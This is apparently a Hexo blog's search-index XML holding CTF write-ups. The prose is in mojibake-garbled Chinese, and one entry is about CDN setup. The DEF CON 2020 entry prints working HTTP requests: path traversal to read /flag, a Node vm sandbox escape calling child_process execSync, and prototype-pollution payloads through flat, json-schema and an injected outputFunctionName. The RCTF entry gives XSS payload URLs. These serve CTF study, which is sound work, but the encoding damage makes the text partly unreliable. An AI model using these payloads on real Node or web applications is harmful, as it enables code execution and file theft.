<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Defcon CTF Final Web WriteUp]]></title>
    <url>%2F2020%2F08%2F11%2Fdefcon%20CTF%20Final%20Web%20WriteUp%2F</url>
    <content type="text"><![CDATA[defcon CTF Final Web WriteUpÂàíÊ∞¥WebÈÄâÊâãÁ¨¨‰∏ÄÊ¨°ÊâìdefconÔºåÊúâÂπ∏ËÉΩÂíåA*0*EÁöÑÂ§ß‰Ω¨‰ª¨‰∏ÄËµ∑ËßÅËØÅÂéÜÂè≤ÔºåËÜú!! ÊØîËµõÂàÜÂõõÂú∫ÔºåÁ¨¨ÂõõÂú∫ÁöÑ0ÁÇπÊó∂ÂÄôÊâçÊîæwebÈ¢ò Ê∫êÁ†ÅÔºöhttps://github.com/o-o-overflow/dc2020f-nooode-public ‰∏ÄÈÅìnodeJSÂÆ°ËÆ°Ôºå‰ªªÊÑèÊñá‰ª∂ÂåÖÂê´ÔºåÈúÄË¶ÅÁªìÂêà‰∏ÄÂ†Ü‰æùËµñÂ∫ìÊâæÂà©Áî®Ôºö ÊØîËµõÂàöÂºÄÂßãÁöÑÊó∂ÂÄôÂèØ‰ª•ÈÄöËøáÈùûÈ¢ÑÊúüÁ≠âÁ≠âÂßøÂäøÊù•Áõ¥Êé•ÂåÖÂê´flag1234567891011121314151617181920POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1Host: 10.13.37.1:4017User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: /Connection: keep-aliveContent-Length: 9&#123;'foo':1&#125;HTTP/1.1 500 Internal Server ErrorContent-Type: text/html; charset=utf-8Content-Length: 872ETag: W/"368-7Bom1uI0U2E3Qp7J9cAwdko+TRk"Date: Sun, 09 Aug 2020 16:33:58 GMTConnection: keep-alive&lt;h1&gt;Invalid or unexpected token&lt;/h1&gt;&lt;h2&gt;&lt;/h2&gt;&lt;pre&gt;/flag:100059F8A3FCCD27002E4EE7F05C7ED50540869180234D354^^^^^ ÊàñËÄÖÁºñÁ†Å‰∏Ä‰∏ã/1234POST /config/validated/%2fflag/test HTTP/1.1Host: 10.13.37.1:4017User-Agent: curl/7.68.0Accept: */* ÂêéÊù•Â§ßÂÆ∂‰øÆÂ§çÂæàÂ§öÈÉΩÁõ¥Êé•Á≤óÊö¥ÁöÑÊäärequire„ÄÅreadFileSyncÁöÑÂèÇÊï∞ÈÉΩÁªôÊàêÂ∏∏ÈáèÔºåÁÑ∂ÂêéÂ∞±Ê≤°Ê¥ûÊâì‰∫Ü„ÄÇ Â§ßÊ¶ÇÂà∞‰∫Ü‰∏§ÁÇπÁöÑÊ†∑Â≠êÔºåÈáçÁΩÆ‰∫ÜpatchÔºå‰∏çËÉΩÁî®ÂéüÊù•Áõ¥Êé•ÂÜôÊ≠ªrequireÁöÑÊñπÂºèpatch‰∫ÜÔºåÁôΩÂêçÂçïpatch‰ºöË¢´checkÔºåÊúÄÂêéÊ†πÊçÆÂ∑≤Áü•poc‰∏Ä‰∏™‰∏™Âä†ÁöÑÈªëÂêçÂçïpatch ÊâìnodeÂÜÖÁΩÆÂ∫ìvmÊ≤ôÁÆ±ÈÄÉÈÄ∏ÁöÑpayloadÔºåÂú®devdocs.ioÂèØ‰ª•ÊâæÂà∞ÂÖ∂‰ªñÂÜÖÁΩÆÂ∫ì12345678910POST /config/validated/vm/runInThisContext HTTP/1.1Host: 10.13.37.1:4017User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: /Connection: keep-alivecontent-type: application/jsonContent-Length: 158[&quot;var process = this.constructor.constructor(&apos;return this.process&apos;)(); process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /f&apos;+&apos;l&apos;+&apos;a&apos;+&apos;g&apos;).toString()&quot;] È¢ÑÊúüËß£Êúâ‰∏Ä‰∏™Â∫îËØ•ÊòØÁî®flatÁöÑ‰∏Ä‰∏™ÂéüÂûãÈìæÊ±°ÊüìÔºöhttps://github.com/hughsk/flat/issues/10512345678910POST /config/validated/flat/unflatten HTTP/1.1Host: 10.13.37.1:4017Connection: keep-aliveAccept-Encoding: gzip, deflateAccept: /User-Agent: python-requests/2.24.0Content-Length: 22Content-Type: application/x-www-form-urlencoded__proto__.path=%2Fflag flatÊòØ‰∏Ä‰∏™jsÁöÑÂØπË±°Ëß£ÊûêÂ∫ìÔºåÊèê‰æõ‰∫ÜÂÉè‰∏ãÂõæËøôÊ†∑Ëß£ÊûêÂØπË±°ÁöÑÂäüËÉΩÔºåÂΩì‰º†ÂÖ•__proto__.pathËøôÊ†∑ÁöÑÂèÇÊï∞Êó∂ÔºåÂç≥‰ºöË¢´Ê±°ÊüìÂéüÂûã„ÄÇ Ê∫êÁ†ÅÂàÜÊûêÔºöÈÄöËøá.ÂàÜÂâ≤ÂèÇÊï∞ÔºåÂ∞Ü__proto__ÂΩìÊàêkey‰º†ÂÖ•Âç≥ÂèØÊ±°ÊüìÂéüÂûã Âè¶Â§ñËøôÈáåËøòÊúâ‰∏Ä‰∏™ÁâπÊÄßÂç≥jsÈáåÂèØ‰ª•‰º†ÂÖ•ÈÉ®ÂàÜÂèÇÊï∞Êù•ËøõË°åÂáΩÊï∞Ë∞ÉÁî®Ôºå‰∏çÂêå‰∫éjavaÁöÑÂ§öÊÄÅÔºö ‰øÆÂ§çÔºö‰ΩúËÄÖÂú®‰øÆÂ§ç‰∏≠Âà§Êñ≠‰∫Ükey1‰∏çËÉΩ‰∏∫__proto__: ËøòÊúâ‰∏Ä‰∏™flag‰ºöË¢´Êà™Êñ≠ÁöÑÈìæ1234567891011121314151617181920212223POST /config/validated/jsonlint/main HTTP/1.1Host: 10.13.37.1:4017User-Agent: python-requests/2.24.0Accept-Encoding: gzip, deflateAccept: */*Connection: keep-aliveContent-Type: application/jsonContent-Length: 33&#123;&quot;1&quot;:&quot;../../../../../../../flag&quot;&#125;HTTP/1.1 500 Internal Server ErrorContent-Type: text/html; charset=utf-8Content-Length: 1188ETag: W/&quot;4a4-a7qhEennNdtDoehPQx3fDgEK7ww&quot;Date: Sun, 09 Aug 2020 18:26:27 GMTConnection: keep-alive&lt;h1&gt;Parse error on line 1:0002DE946789B7BCFFCC^Expecting &amp;#39;STRING&amp;#39;, &amp;#39;NUMBER&amp;#39;, &amp;#39;NULL&amp;#39;, &amp;#39;TRUE&amp;#39;, &amp;#39;FALSE&amp;#39;, &amp;#39;&#123;&amp;#39;, &amp;#39;[&amp;#39;, got &amp;#39;undefined&amp;#39;&lt;/h1&gt;&lt;h2&gt;&lt;/h2&gt;&lt;pre&gt;Error: Parse error on line 1:0002DE946789B7BCFFCC Â§ßÊ¶Ç5ÁÇπÁöÑÊ†∑Â≠êÊµÅÈáèÁõëÊéßÂà∞tdÁöÑÂ§ß‰Ω¨ËΩØËøûÊé•ËØªÂà∞Êàë‰ª¨ÁöÑflag‰∫Ü12345678910111213POST /config/validated/fstream/Writer HTTP/1.1Host: 127.0.0.1:4017User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 76Cookie: __utma=96992031.1308333994.1563790586.1563790586.1563793582.2; csrftoken=jDxu0gfu0oXpRCP5r0wYq0UA7dQau6KfqbXOYH4PQ9O87MwCx5ZAz0THbRMzId2TConnection: closeUpgrade-Insecure-Requests: 1&#123;&quot;type&quot;:&quot;SymbolicLink&quot;,&quot;linkpath&quot;:&quot;/flag&quot;,&quot;path&quot;:&quot;public/stylesheets/wupco&quot;&#125; ËøôÈáåËøòÂèØ‰ª•ÈÄöËøáËΩØËøûÊé•Ê∫êÁ†ÅÂéªËØªÂà´‰∫∫patchÁªïËøá„ÄÇ json-schemaÁöÑgadget:12345678910POST /config/validated HTTP/1.1Host: 10.13.37.3:4017User-Agent: python-requests/2.11.1Accept-Encoding: gzip, deflateAccept: /Connection: keep-aliveContent-Length: 90Content-Type: application/json&#123;&quot;$schema&quot;: &#123;&quot;properties&quot;: &#123;&quot;__proto__&quot;: &#123;&quot;properties&quot;: &#123;&quot;path&quot;: &#123;&quot;default&quot;: &quot;/flag&quot;&#125;&#125;&#125;&#125;&#125;&#125; Ë∞ÉÁî®validate:‰º†ÂÖ•ÂèØÊéßÁöÑinstanceÂèÇÊï∞Ôºåschema‰∏∫instance.$schema‰º†ÂÖ•Ôºö ËøôÈáå‰∏ªË¶ÅÁúã164Ë°åcheckObjÁöÑË∞ÉÁî®ÔºåÊ≥®ÊÑèÁ¨¨‰∫å‰∏™ÂèÇÊï∞schema.propertiesÔºåÂç≥‰∏∫Êàë‰ª¨postÁöÑjsonÊï∞ÊçÆÔºö checkObjÂáΩÊï∞ÁöÑ‰ª£Á†ÅÂ¶Ç‰∏ãÔºåÂ∞ÜpropDefËµãÂÄº‰∏∫objTypeDef.__proto__ÔºåÂç≥schema.properties.__proto__ÔºåÁÑ∂Âêé‰Ωú‰∏∫ÂèÇÊï∞ÂÜçÊ¨°Ë∞ÉÁî®checkProp(value, schema, path, i)ÔºåËÄåvalueÂèòÊàê‰∫Üinstance[i]Âç≥instanceÁöÑÂéüÂûãinstance.__proto__Ôºö ÁÑ∂ÂêéÂèàÂà∞‰∫Ü‰ªécheckProp()ÊâßË°åÂà∞‰∫ÜcheckObj()ÂáΩÊï∞ÔºöÂÜç‰∏ÄÊ¨°Ëé∑ÂèñÁ¨¨‰∫å‰∏™ÂèÇÊï∞schema.properties ÊúÄÂêéÂ∞ÜpropDef[&quot;default&quot;]‰πüÂ∞±ÊòØ/flagÔºå‰º†ÈÄíÁªô‰∫ÜvalueÔºå‰πüÂ∞±ÊòØinstanceÁöÑÂéüÂûãÔºåÂç≥ÊàêÂäüÊ±°ÊüìÔºö ÂÖ∂‰ªñÂá†‰∏™ÈìæÔºö1&#123;&quot;$schema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;outputFunctionName&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;x;var buf = Buffer.alloc(128);var fs = process.mainModule.require(`fs`);var fd=fs.openSync(`/fl`+`ag`);fs.readSync(fd, buf, 0, 128);fs.closeSync(fd);return buf.toString();//x&quot;&#125;,&quot;path&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;default&quot;:&quot;/foo&quot;&#125;&#125;&#125;&#125;&#125;&#125; https://twitter.com/CVEnew/status/1283502926011543555 ‰øÆÂ§ç‰ª£Á†Å12345678910111213141516if(JSON.stringify(req.body).includes(&apos;__&apos;)) throw new Error(&apos;fuck&apos;)if([&apos;vm&apos;, &apos;node-sass&apos;, &apos;jsonlint&apos;, &apos;ejs&apos;].includes(req.params.lib)) throw new Error(&apos;asdf&apos;)if(req.params.lib.includes(&apos;flag&apos;)) throw new Error(&apos;asdf&apos;)// pigÁöÑ‰øÆÂ§çfor(var Val in Object.prototype)&#123; console.log(Val) if(Object.hasOwnProperty(Val))&#123; continue &#125;else&#123; delete Object.prototype[Val]; console.log(`$&#123;Object.prototype[Val]&#125;is delete`); &#125;&#125; Âõ†‰∏∫~ÁöÑÂéüÂõ†‰∏îÂá∫È¢ò‰∫∫Ê≤°ÁªôlockÊñá‰ª∂ÂØºËá¥ÔºöÊúçÂä°Âô®ÂèØ‰ª•ÁúãÂà∞warnÊºèÊ¥ûÔºöËÄåÊú¨Âú∞Âï•‰πüÊ≤°Êúâ Âá†‰∏™ÂÖ≥ÈîÆÁöÑÊó∂Èó¥ËäÇÁÇπÔºö(Êù•Ëá™CodyÂ§ß‰Ω¨ÁöÑÂ§çÁõò]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCTF2020 Rblog WriteUp]]></title>
    <url>%2F2020%2F06%2F01%2FRCTF-2020-WriteUp%2F</url>
    <content type="text"><![CDATA[È¢òÁõÆÊòØ‰∏Ä‰∏™Áî®Êà∑ÂèØ‰ª•ÈÄöËøá‰º†ÂÖ•Ê≠£ÂàôÊù•ÂØπÈÄâÂèñÊñáÁ´†ÂÜÖÂÆπËøõË°åÈ´ò‰∫ÆÊòæÁ§∫ÁöÑÂäüËÉΩÔºö ËøáÊ≠£ÂàôÊ†°È™åÔºö‰∏çËÉΩÊúâÂ∞ñÊã¨Âè∑‰∏îÂ≠óÁ¨¶‰∏çËÉΩË∂ÖËøá36 12345678910111213141516171819202122function highlight_word() &#123; u = new URL(location) hl = u.searchParams.get('highlight') || '' if (hl) &#123; // ban html tags if (hl.includes('&lt;') || hl.includes('&gt;') || hl.length &gt; 36) &#123; u.searchParams.delete('highlight') history.replaceState('', '', u.href) alert('‚ö†Ô∏è illegal highlight word') &#125; else &#123; // why the heck this only highlights the first occurrence? stupid javascript üò† // content.innerHTML = content.innerHTML.replace(hl, `&lt;b class="hl"&gt;$&#123;hl&#125;&lt;/b&gt;`) hl_all = new RegExp(hl, 'g') replacement = `&lt;b class="hl"&gt;$&#123;hl&#125;&lt;/b&gt;` post_content.innerHTML = post_content.innerHTML.replace(hl_all, replacement) let b = document.querySelector('b[class=hl]') if (b) &#123; typeof b.scrollIntoViewIfNeeded === "function" ? b.scrollIntoViewIfNeeded() : b.scrollIntoView() &#125; &#125; &#125;&#125; ÁúãÊñáÊ°£Ôºöhttps://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace 1const newStr = str.replace(regexp|substr, newSubstr|function) str.replaceÊúâ‰ª•‰∏ãÂá†ÁßçÁâπÊÆäÊ®°ÂºèÔºö Á¨¨‰∏ÄÁßçÔºöÁî®$&amp;ÂºïÁî®ÂåπÈÖçÂà∞ÁöÑ&lt;:1http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=.|$%26svg/onload=alert(1)+ Á¨¨‰∫åÁßçÔºöÁî®$`Êù•Ëé∑ÂèñpÊ†áÁ≠æÂâçËæπÁöÑ&lt;1http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=p|$`svg/onload=alert(1)+ Á¨¨‰∏âÁßçÔºö$nËøôÁßçÂ∞±ÊòØÁî®ÁöÑÊúÄÂ§öÁöÑÂºïÁî®ÂåπÈÖçÔºåÁº∫ÁÇπÂ∞±ÊòØÈúÄË¶ÅÂ∏¶Êã¨Âè∑ 1http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=(.)|$1svg/onload=alert(1)+ ÊºèÊ¥ûÂà©Áî®ÔºöÈÄöËøáwrite(unescape(u))Êù•ÂÜôÂÖ•ÂΩìÂâçurlÊù•ËøõË°å‰ªªÊÑè‰ª£Á†ÅÊâßË°åÔºö1http://120.79.152.66:65480/posts/6292038b-4fba-4344-af2a-6b92a788d606?highlight=[$`style onload=write(unescape(u)) ]#?highlight=&lt;script&gt;alert(1)&lt;%2Fscript&gt; ÂÆòÊñπËß£Ê≥ïÈáåËøòÊúâÂá†‰∏™ÊúâÊÑèÊÄùÁöÑÁÇπÔºöÂú®feedbackÊèê‰∫§ÁªôÁÆ°ÁêÜÂëò‰∏çËÉΩÁî®/12345678910111213141516171819&lt;script&gt; axios.get('?fetch').then(resp =&gt; &#123; for (let i of resp.data) &#123; let params = new URLSearchParams() params.set('highlight', i.highlight_word) if (i.link.includes('/') || i.link.includes('\\')) &#123; continue; // bye bye hackers uwu &#125; let a = document.createElement('a') a.href = `$&#123;i.link&#125;?$&#123;params.toString()&#125;` a.text = `$&#123;i.ip&#125;: $&#123;a.href&#125;` feedback_list.appendChild(a) feedback_list.appendChild(document.createElement('br')) &#125; feedback_list.innerHTML = DOMPurify.sanitize(feedback_list.innerHTML) &#125;, err =&gt; &#123; feedback_list.innerText = err &#125;)&lt;/script&gt; bypass: ËÜúhpdoger!!! ËÜúÂá∫È¢ò‰∫∫]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂçöÂÆ¢‰∏ä‰∫ë‰ºòÂåñÂ∞èËÆ∞]]></title>
    <url>%2F2020%2F03%2F20%2F%E5%8D%9A%E5%AE%A2%E4%B8%8A%E4%BA%91%E5%B0%8F%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[ÂÖàËØ¥ÁªìËÆ∫ÔºåÂçÉ‰∏áÂà´Áî®ÂçÉÁâõ‰∫ëÔºÅÔºÅ ‰ºòÂåñÁªìÊûúÔºö‰ªé‰ª•ÂâçÁöÑ8ÁßíÈÉΩÂá∫‰∏çÊù•ÔºåÂà∞Áé∞Âú®ÁßíÂºÄÔºö ÊúÄÂºÄÂßãÊòØËø´‰∫éÂõæÂ∫äÈúÄÊ±ÇÔºå‰πãÂâç‰∏ÄÁõ¥Áî®ÁöÑsm.msÔºåÊúÄÂºÄÂßãÈÄüÂ∫¶ÊÖ¢Â∞±ÁÆó‰∫ÜÔºåÂáëÂêàÁî®‰∏Ä‰∏ãÔºåÂà∞ÂêéÊù•ÊääÊàë‰º†ÁöÑÂõæÁâábanÊéâ‰∫ÜÔºåÂØºËá¥‰πãÂâçÂÜôÁöÑÊñáÁ´†ÂõæÁâáÂ§ßÈáè404ÔºåÂÖ≥ÈîÆÊòØÈáçÊñ∞‰º†‰πü‰º†‰∏ç‰∏ä.. Âä†‰∏äÊúÄËøëÂÜô‰∫Ü‰∏ÄÁØáÂõæÁâáË¥ºÂ§öÁöÑÊñáÁ´†ÔºåËÆøÈóÆÈÄüÂ∫¶Â∑®ÊÖ¢ÔºåÂøç‰∏ç‰ΩèÂ∞±ÂºÄÂßãÊâæÂõæÂ∫ä„ÄÇ ÂæàÊó©‰πãÂâçÁúãÂà∞ÂçÉÁâõ‰∫ëÊØè‰∏™ÊúàÂÖçË¥π10G S3ÂØπË±°Â≠òÂÇ®Ôºå‰ΩÜÊòØË¶ÅË∫´‰ªΩËØÅÁÖßÁâáÔºå‰∏ÄÁõ¥ÊêÅÁΩÆÊ≤°Áî®ÔºåÊò®Â§©ÂàÜÊûêÂÆåÊºèÊ¥ûÊó†‰∫ãÔºåÂ∞±‰∏ÄËµ∑Êää‰πãÂâçÂêÉÁÅ∞ÁöÑÂüüÂêçÈÉΩÂÆûÂêç‰∫Ü„ÄÇ ‰πãÂâç‰∏ÄÁõ¥‰ª•‰∏∫Êª°Ë∂≥ÊàëÂõæÂ∫äÈúÄÊ±ÇÁöÑÂÖçË¥πÁöÑ10g s3ËÉΩ‰∏çËä±Èí±ÔºåÂêéÊù•Âú®ÈÖçÁΩÆËøáÁ®ã‰∏≠ÂèëÁé∞ËøôÁé©ÊÑèÂøÖÈ°ªÂíåcdnÊçÜÁªë‰ΩøÁî®ÔºåÂ•Ω‰∫ÜÔºå‰∏ÉÁâõ‰∫ëcdn httpÂÖçË¥π10gÊµÅÈáèÔºåÁî®Ëøágithub pageÁöÑÈÉΩÁü•ÈÅìÈÖçÁΩÆhttpsÂ∞±ÊòØ‰∏Ä‰∏™ÊåâÈíÆÁöÑ‰∫ãÊÉÖÔºå‰∏çËøáÈóÆÈ¢ò‰∏çÂ§ßÔºåhttpsÁöÑÁ´ôimgÁî®httpÂä†ËΩΩÔºåÂ∞±ÊòØ‰∏ªÈ°µÊúâÈîÅÔºåÁÇπËøõÊñáÁ´†ÂÜÖÂÆπÊ≤°ÈîÅÁöÑÂå∫Âà´„ÄÇ Áî®ÂõΩÂÜÖcdnÊúÄÈ∫ªÁÉ¶ÁöÑÂú∞ÊñπÂú®‰∫éË¶ÅÂ§áÊ°àÔºåËøôÈáåÂ•ΩÂú®ÁôΩÂ´ñ‰∫Ü‰∏Ä‰∏™Â∞èÁªÑÁöÑd0g3.cnÂüüÂêçÔºåÁúÅÂéª‰∫ÜÂæàÂ§öÈ∫ªÁÉ¶„ÄÇ ‰ºòÂåñÂÆåÂõæÁâáÂêéÔºåËÆøÈóÆÊòØÂø´‰∫ÜÂæàÂ§öÔºåÂΩ±ÂìçÂä†ËΩΩÁöÑ‰∏ªË¶ÅÂõ†Á¥†ÂèòÊàê‰∫ÜjsÂíåcssÔºåÁÑ∂ÂêéÊÉ≥È°∫ÊâãÊäähexoÁöÑpublicÁõÆÂΩïÁªôÊãâÂà∞s3‰∏ä„ÄÇ ÁÑ∂ÂêéÊàë‰∫∫ÂÇª‰∫ÜÔºå‰ªñËøô‰∏™‰∏çËÉΩ‰∏ä‰º†Êñá‰ª∂Â§πÂ∞±ÂæàÁ¶ªË∞±Ôºö ÁÑ∂ÂêéÂ∫∑Â∏àÂÇÖËÆ©ÊàëÁî®ftp‰º†‰∏äÂéª(‰ªñÁî®ÁöÑÂèàÊãç‰∫ë)ÔºåÊâæ‰∫ÜÂçäÂ§©ËøûÊé•Â∑•ÂÖ∑ÔºåÁÑ∂ÂêéÊêúÊÄé‰πàÁî®Ôºö ÁªßÁª≠ÊâæËß£ÂÜ≥ÂäûÊ≥ï‚Ä¶ ÊúÄÂêéÊâæ‰∫Ü‰∏™‰ªñ‰ª¨Êé®Âá∫ÁöÑqshellÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÔºåÊÉ≥ÊÉ≥‰πüÁÆó‰∫ÜÔºåhexo‰πüË¶ÅÁî®ÂëΩ‰ª§Ë°åÔºåÂ∞±Êó†ÊâÄË∞ì‰∫Ü„ÄÇ ÊääÈùôÊÄÅËµÑÊ∫êÂêåÊ≠•‰∏äÂéªÔºåÂÆå‰∫ÜÂú®nextÈáåÈÖçÁΩÆ‰∏Ä‰∏ãÔºöÁªìÊûúÂçöÂÆ¢ÊàêËøôÊ†∑‰∫ÜÔºöÂØπÔºåhttpsÁöÑÁ´ôÂä†ËΩΩ‰∏ç‰∫ÜhttpÁöÑjsËµÑÊ∫ê„ÄÇ„ÄÇ ËøôÈáå‰∏∫‰∫ÜÁôΩÂ´ñ10gÁöÑhttp cdnÊµÅÈáèÔºåÊàëÊäähexoÂÖ®ÈÉ®httpsÂÖ®Êç¢Êàê‰∫Ühttp„ÄÇ ÊîπÂÆå‰πãÂêéÔºåËøôÈáåÊúâ‰∏™Âæà‰∏•ÈáçÁöÑÈóÆÈ¢òÔºå‰ª•ÂâçÊãøhttpsËÆøÈóÆËøáÁöÑÔºå‰πãÂêéÊãøhttpËÆøÈóÆÔºåÊµèËßàÂô®‰ºöÊúâÁºìÂ≠òËá™Âä®Ë∑≥httpsÔºåÂèØÊòØÊàëÁ´ôÂº∫Âà∂ËÆøÈóÆhttpsÂ∞±‰ºöÂÉè‰∏äÂõæÈÇ£Ê†∑ÔºåÊ≤°üîêÊ≤°js„ÄÇ„ÄÇ ËøôÈáåÊàëÊÉ≥‰∫Ü‰∏™È™ö‰∏ªÊÑèÔºåÊèí‰∫Ü‰∏ãËæπ‰∏ÄÊÆµ‰ª£Á†ÅÊîæÂú®‰∫Ü‰∏ªÈ°µÔºöÂº∫Âà∂Ë∑≥ËΩ¨Êàêhttp‚Ä¶ ÊµãËØï‰∫Ü‰∏Ä‰∏ãÔºåÁªìÊûúÂ∞±ÊòØÂú®chromeÁºìÂ≠òÂíåjsÁöÑÂèåÈáçÂä†ÊåÅ‰∏ãÔºåhttp-&gt;https-&gt;httpÔºåÊ≠ªÂæ™ÁéØ‚Ä¶. ËøôÈáåÊòØÂÖ≥‰∫Ügithub pageÁöÑforce httpsÊµãËØïÁöÑÔºå‰æùÊóßÂ¶ÇÊ≠§‚Ä¶ Â±àÊúç‰∫ÜÔºåÊúÄÂêéËøòÊòØÈÄâÊã©Ê∞™ÈáëÂêßÔºåÈÉΩËä±‰∫ÜËøô‰πàÂ§öÊó∂Èó¥ÊäòËÖæ‰∫ÜÔºå‰∏çÊÉ≥Êç¢ÂéÇÂïÜ‰∫Ü‚Ä¶CDNÂíåS3ÂàÜÂà´Êî∂Ë¥πÔºö‰∏∫‰∫ÜËäÇÁ∫¶ÊµÅÈáèÔºåÊàëËøòÂä†‰∫Ü‰∏Ä‰∏™Ëøô‰∏™ÂêéÊù•@0akarmaÂ∏àÂÇÖÁªôÊàëËØ¥ÔºåËøô‰∫õÂú®ÂèàÊãç‰∫ëÈÉΩÊòØÂÖçË¥πÁöÑÔºåÊàë‚Ä¶ Â•Ω‰∫ÜÔºåÂÖ®Á´ôhttps‰πãÂêéÔºåÂèàÊúâÊñ∞ÁöÑÈóÆÈ¢ò‰∫ÜÔºöwoffÁ≠âÂ≠ó‰ΩìÊñá‰ª∂Ë¶ÅÈÖç‰∏Ä‰∏™Ë∑®ÂüüËµÑÊ∫êÂÖ±‰∫´(CORS)ÔºåÁÑ∂ÂêéÂá≠ÁùÄÂç∞Ë±°ËÆ∞ÂæóS3ÂØπË±°Â≠òÂÇ®ÈÇ£Êúâ‰∏Ä‰∏™ËµÑÊ∫êÂÖ±‰∫´ÈÖçÁΩÆÔºö ÈÖç‰∫Ü‰πãÂêé‰ª•‰∏∫Ë¶ÅÂª∂ËøüÁîüÊïàÔºåÂá∫ÂéªÊâì‰∫Ü‰∏™ÁêÉÂõûÊù•ÔºåËøòÊòØ‰∏çË°åÔºåÁÑ∂ÂêéÁΩë‰∏äÊêú‰∫Ü‰∏Ä‰∏ãÔºöËøôÊ≥¢Êìç‰ΩúÂ±ûÂÆûÁªôÊàëÊï¥Âêê‰∫ÜÔºåÂú®‰∏ÉÁâõ‰∫ëÊéßÂà∂Âè∞ËΩ¨‰∫Ü‰∏ÄÂ§©Ôºå‰πüÊ≤°ÁúãÂà∞CDNÊúâË∑®ÂüüÁöÑÈÖçÁΩÆ„ÄÇÂêéÊù•ÊÉ≥ÊÉ≥‰πüÁ°ÆÂÆûÂæóÂú®CDNÁöÑÂìçÂ∫î‰∏äÈÖçÁΩÆ„ÄÇ ÂêéÊù•ËøòÈÅáÂà∞Âá†‰∏™Â∞èÈóÆÈ¢òÔºåwoffÂ≠ó‰ΩìÁöÑrefererÊòØcssÔºåËÄå‰∏çÊòØurlÔºåËøôÈáåÂú®Èò≤ÁõóÈìærefererÊ†°È™åÈÇ£Âä†‰∏Ä‰∏™ÁôΩÂêçÂçïÂ∞±Ë°å‰∫ÜÔºö Âà∞Áé∞Âú®ÔºåÂ∞±Âè™ÊúâhtmlÂú®github‰∏ä‰∫ÜÔºåÊàëËÆøÈóÆhttps://static-passer6y.d0g3.cn/Ôºå‰∏ç‰πüÊòØÊàëÁöÑÂçöÂÆ¢ÂêóÔºå‰∏∫‰ªÄ‰πàËøòË¶ÅÁî®github pageÂë¢ÔºåËÄå‰∏îËøòËß£ÂÜ≥‰∫ÜhtmlÂä†ËΩΩÊÖ¢ÁöÑÈóÆÈ¢ò„ÄÇ ÁÑ∂ÂêéÊàëÂ∞±ÊÉ≥ÁùÄÂéªÂä†‰∏Ä‰∏™@ÁöÑcnameËß£ÊûêÂà∞static-passer6y.d0g3.cnÔºåÂú®Ëøô‰πãÂâçÊàëÈÖç‰∫Ü‰∏Ä‰∏™mxÁöÑ@ËÆ∞ÂΩïÔºåÁî®Êù•Êî∂ÈÇÆ‰ª∂ÁöÑ„ÄÇ ‰∏ÄÊ≥¢Êìç‰Ωú‰∏ãÔºåÈòøÈáå‰∫ë‰∏çÊîØÊåÅ@ÁöÑcnameÂíåmxËÆ∞ÂΩïÂÖ±Â≠ò‚Ä¶ ÁÆó‰∫Ü‰∏çÊäòËÖæ‰∫ÜÔºåÈô§‰∫ÜhtmlÊñá‰ª∂Âú®github‰∏äÔºåÂÖ∂‰ªñÁöÑÈÉΩ‰ºòÂåñ‰∫Ü„ÄÇ ÊúÄÂêéÔºåÊäòËÖæ‰∫ÜÂ§ßÂçäÂ§©Ôºå‰∏ÉÁâõ‰∫ëÊéßÂà∂Âè∞Áªô‰ø∫Êï¥Âêê‰∫ÜÔºå‰∫∫ÁîüÂø†ÂëäÔºåÂçÉ‰∏áÂà´Áî®‰∏ÉÁâõ‰∫ë.. Á¨¨‰∏ÄÊ¨°‰∏ä‰∫ëÁúüÈ¶ôÔºåÂ∞±ÊòØÊµÅÈáèÊúâÁÇπË¥µ„ÄÇ]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Others</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic IIOPÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂàÜÊûê(CVE-2020-2551)]]></title>
    <url>%2F2020%2F03%2F19%2FWeblogic%20IIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
